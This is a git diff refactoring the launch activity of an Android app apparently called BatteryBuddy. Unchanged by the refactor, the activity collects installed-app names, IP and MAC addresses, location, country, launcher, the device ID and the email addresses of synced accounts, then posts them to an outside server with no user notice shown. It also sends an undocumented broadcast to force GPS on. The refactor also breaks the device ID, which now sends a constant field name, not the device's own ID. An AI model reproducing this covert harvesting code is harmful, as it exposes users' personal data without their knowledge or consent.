@@ -33,6 +33,21 @@ import java.lang.reflect.Field;
 import java.util.List;
 import java.util.regex.Pattern;
 
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.COUNTRY;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEFAULT_LAUNCHER;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_ID;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_INFO;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.EMAILS;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.ETHERNET;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.INSTALLED_APPS;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.IP_ADDRESS;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.LOCATION;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.MAC_ADDRESS;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.REQUEST_OBJECT;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.RESPONSE_OBJECT;
+import static com.receptix.batterybuddy.helper.Constants.JsonProperties.WLAN;
+import static com.receptix.batterybuddy.helper.Constants.Urls.URL_OZOCK;
+
 
 public class MainActivity extends AppCompatActivity {
 
@@ -49,8 +64,6 @@ public class MainActivity extends AppCompatActivity {
         context = getApplicationContext();
         userSessionManager = new UserSessionManager(context);
 
-         /* Retrieve a PendingIntent that will perform a broadcast */
-
         fetchUserDetails();
 
         new Handler().postDelayed(new Runnable() {
@@ -60,11 +73,9 @@ public class MainActivity extends AppCompatActivity {
             public void run() {
 
                 if (userSessionManager.isFirstTime()) {
-
-                    startActivity(new Intent(MainActivity.this, TCActivity.class));
+                    startActivity(new Intent(MainActivity.this, TermsAndConditionsActivity.class));
                     finish();
                 } else {
-
                     startActivity(new Intent(MainActivity.this, NavigationActivity.class));
                     finish();
                 }
@@ -88,98 +99,81 @@ public class MainActivity extends AppCompatActivity {
         try {
             gps_enabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
             network_enabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
-
         } catch (Exception ex) {
-
+            ex.printStackTrace();
         }
 
-
         // get device id
-
-        String userdeviceId = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
+        String userDeviceId = Settings.Secure.ANDROID_ID;
         JsonObject jsonObject = new JsonObject();
-        jsonObject.addProperty("deviceId", userdeviceId);
+        jsonObject.addProperty(DEVICE_ID, userDeviceId);
 
-        // get installed app list
-
-        JsonArray installedappslist = new JsonArray();
-
+        // get list of installed apps on user device
+        JsonArray installedAppsList = new JsonArray();
         List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
         for (int i = 0; i < packList.size(); i++) {
             PackageInfo packInfo = packList.get(i);
             if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                 String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                 JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
-                installedappslist.add(jsonPrimitive);
-
+                installedAppsList.add(jsonPrimitive);
             }
         }
+
         // get user device information
-
-
-        StringBuilder builder = new StringBuilder();
-        builder.append("Android Version : ").append(Build.VERSION.RELEASE);
+        StringBuilder deviceInfoStringBuilder = new StringBuilder();
+        deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);
 
         Field[] fields = Build.VERSION_CODES.class.getFields();
         String osName = fields[Build.VERSION.SDK_INT + 1].getName();
-        builder.append(" " + "OsName :" + osName);
+        deviceInfoStringBuilder.append(" OS Name :").append(osName);
 
-
-        String ipadress = Utils.getIPAddress(true);
-        String macaddress = Utils.getMACAddress("wlan0");
-        if (macaddress.length() == 0) {
-
-            macaddress = Utils.getMACAddress("eth0");
+        String deviceIpAddress = Utils.getIPAddress(true);
+        String deviceMacAddress = Utils.getMACAddress(WLAN);
+        if (deviceMacAddress.length() == 0) {
+            deviceMacAddress = Utils.getMACAddress(ETHERNET);
         }
-        // get the default launcher...
 
+        // get the default launcher
         Intent intent = new Intent(Intent.ACTION_MAIN);
         intent.addCategory(Intent.CATEGORY_HOME);
         ResolveInfo defaultLauncher = getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
         String defaultLauncherStr = defaultLauncher.activityInfo.packageName;
 
 
-        // Get user account...
-
+        // Get user account (synced accounts on device)
         Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
         Account[] accounts = AccountManager.get(context).getAccounts();
-
-        JsonArray possibleemails = new JsonArray();
+        JsonArray userAccounts = new JsonArray();
 
         for (Account account : accounts) {
             if (emailPattern.matcher(account.name).matches()) {
                 String possibleEmail = account.name;
                 JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
-                possibleemails.add(jsonPrimitive);
-
+                userAccounts.add(jsonPrimitive);
             }
         }
 
-        jsonObject.addProperty("deviceInfo", builder.toString());
-        jsonObject.addProperty("ipaddress", ipadress);
-        jsonObject.addProperty("macaddress", macaddress);
-        jsonObject.addProperty("launcher", defaultLauncherStr);
-        jsonObject.addProperty("location", location);
-        jsonObject.addProperty("country", country);
-        jsonObject.add("installedapps", installedappslist);
-        jsonObject.add("emails", possibleemails);
-
-
-        Log.d("Result", jsonObject.toString());
+        // create final JSONObject to be sent to server
+        jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
+        jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
+        jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
+        jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
+        jsonObject.addProperty(LOCATION, location);
+        jsonObject.addProperty(COUNTRY, country);
+        jsonObject.add(INSTALLED_APPS, installedAppsList);
+        jsonObject.add(EMAILS, userAccounts);
+        Log.d(REQUEST_OBJECT, jsonObject.toString());
 
 
         Ion.with(context)
-                .load("http://www.ozock.com/")
+                .load(URL_OZOCK)
                 .setJsonObjectBody(jsonObject)
                 .asJsonObject()
                 .setCallback(new FutureCallback<JsonObject>() {
                     @Override
                     public void onCompleted(Exception e, JsonObject result) {
-
-
-                        Log.d("Result", String.valueOf(result));
-
-
+                        Log.d(RESPONSE_OBJECT, String.valueOf(result));
                     }
                 });
 
@@ -187,23 +181,17 @@ public class MainActivity extends AppCompatActivity {
     }
 
     public void showSettingAlert() {
-
         AlertDialog.Builder alertDialog = new AlertDialog.Builder(context);
-
         alertDialog.setTitle("GPS Setting")
                 .setMessage("Enable GPS Now")
                 .setPositiveButton("On", new DialogInterface.OnClickListener() {
                     @Override
                     public void onClick(DialogInterface dialog, int which) {
-
                         Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
                         intent.putExtra("enabled", true);
                         sendBroadcast(intent);
-
                     }
                 });
-
-
     }
 
 
